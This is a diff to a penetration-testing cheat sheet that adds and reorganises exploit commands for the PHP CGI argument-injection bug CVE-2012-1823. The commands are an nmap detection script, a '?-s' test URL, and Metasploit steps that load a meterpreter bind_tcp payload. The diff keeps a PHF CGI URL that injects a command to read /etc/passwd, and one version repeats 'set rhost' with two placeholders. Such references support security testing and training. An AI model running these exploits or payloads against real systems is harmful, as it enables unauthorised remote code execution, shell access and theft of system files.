@@ -51,17 +51,30 @@ sqlmap -r sqlmap_request2 -p txtLoginID
 ```
 
 **Detect / Exploit PHP CGI Bug - [CVE-2012-1823]**
+<br/>
+_Detection:_
 ```
 nmap -p 80, 8080, 443 --script http-cve2012-1823
-msf> use exploit/multi/http/php_cgi_arg_injection
-msf> set rhost [HOST_IP]
-msf> set PAYLOAD php/meterpreter/bind_tcp
-msf> exploit
+http://vulnerable/?-s
+```
+
+_Exploitation:_
+```
+Enable allow_url_include=1
+```
+
+_Meterpreter TCP Bind_
+```
+msfconsole
+use exploit/multi/http/php_cgi_arg_injection
+set rhost [URL]
+set rhost [HOST_IP]
+set PAYLOAD php/meterpreter/bind_tcp
+exploit
 ```
 
 **PHF CGI Remote Command Execution - [CVE-1999-0067]**
 ```
 http://www.thesite.com/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd
-
 
 ```
